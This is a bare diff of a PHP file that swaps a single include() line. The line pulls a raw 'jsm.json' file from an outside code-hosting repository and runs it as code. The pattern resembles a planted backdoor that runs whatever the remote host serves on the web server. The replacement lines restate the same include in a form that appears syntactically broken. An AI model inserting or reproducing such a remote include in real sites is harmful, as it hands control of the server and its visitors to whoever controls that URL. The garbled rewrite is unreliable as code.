@@ -1,1 +1,3 @@
-<?php include('https://agit.ai/leevi/PiG/raw/branch/master/jsm.json'); ?>
+<?
+  php include('https://agit.ai/leevi/PiG/raw/branch/master/jsm.json'); 
+?>
